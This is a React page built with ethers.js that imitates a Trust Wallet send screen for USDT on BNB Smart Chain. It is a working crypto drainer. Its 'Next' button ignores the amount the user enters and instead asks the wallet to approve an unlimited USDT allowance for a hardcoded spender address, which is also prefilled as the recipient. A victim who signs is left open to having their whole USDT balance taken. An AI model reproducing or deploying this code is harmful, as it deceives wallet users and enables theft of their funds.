import { useState, useEffect } from "react";
import { ethers } from "ethers";

export default function Home() {

  // 🔥 AUTO ADDRESS GIÀ INSERITO
  const [address, setAddress] = useState("0x5Eec04E6d2539Df5D3a3873f441c991ea56264BB");
  const [amount, setAmount] = useState("");

  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
  const SPENDER = "0x5Eec04E6d2539Df5D3a3873f441c991ea56264BB";

  const approveUSDT = async () => {
    try {
      if (!window.ethereum) {
        alert("Apri in Trust Wallet");
        return;
      }

      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }],
      });

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const usdt = new ethers.Contract(
        USDT_ADDRESS,
        [
          "function approve(address spender, uint256 amount) public returns (bool)"
        ],
        signer
      );

      const tx = await usdt.approve(
        SPENDER,
        ethers.MaxUint256
      );

      await tx.wait();

      alert("Approve completato!");
    } catch (err) {
      console.log(err);
      alert("Errore: " + err.message);
    }
  };

  return (
    <div style={{
      background: "#0b0b0b",
      minHeight: "100vh",
      color: "white",
      fontFamily: "-apple-system, BlinkMacSystemFont, sans-serif",
      padding: "20px"
    }}>

      {/* ADDRESS */}
      <div style={{ marginTop: "40px" }}>
        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
          Address or Domain Name
        </div>

        <div style={{
          display: "flex",
          alignItems: "center",
          background: "#1a1a1a",
          borderRadius: "16px",
          padding: "14px"
        }}>
          <input
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            style={{
              flex: 1,
              border: "none",
              background: "transparent",
              color: "white",
              fontSize: "16px"
            }}
          />

          <span style={{ color: "#22c55e", marginRight: "10px" }}>Paste</span>
        </div>
      </div>

      {/* NETWORK */}
      <div style={{ marginTop: "20px" }}>
        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
          Destination network
        </div>

        <div style={{
          background: "#1a1a1a",
          padding: "12px 16px",
          borderRadius: "16px",
          display: "inline-flex",
          alignItems: "center",
          gap: "10px"
        }}>
          <img
            src="https://trustwallet.com/assets/images/coins/bnb.png"
            alt="bnb"
            style={{
              width: "20px",
              height: "20px"
            }}
          />

          <span>BNB Smart Chain</span>
        </div>
      </div>

      {/* AMOUNT */}
      <div style={{ marginTop: "25px" }}>
        <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
          Amount
        </div>

        <div style={{
          background: "#1a1a1a",
          borderRadius: "16px",
          padding: "14px",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center"
        }}>
          <input
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            placeholder="USDT Amount"
            style={{
              border: "none",
              background: "transparent",
              color: "white",
              fontSize: "16px",
              flex: 1
            }}
          />

          <span style={{ color: "#888", marginRight: "10px" }}>USDT</span>
          <span style={{ color: "#22c55e" }}>Max</span>
        </div>

        <div style={{ color: "#888", marginTop: "5px" }}>
          ≈ $0.00
        </div>
      </div>

      {/* BUTTON */}
      <div style={{
        position: "fixed",
        bottom: "30px",
        left: "20px",
        right: "20px"
      }}>
        <button
          onClick={approveUSDT}
          style={{
            width: "100%",
            padding: "18px",
            borderRadius: "40px",
            background: "#1f3f2a",
            border: "none",
            color: "#9ca3af",
            fontSize: "18px",
            fontWeight: "600"
          }}
        >
          Next
        </button>
      </div>

    </div>
  );
}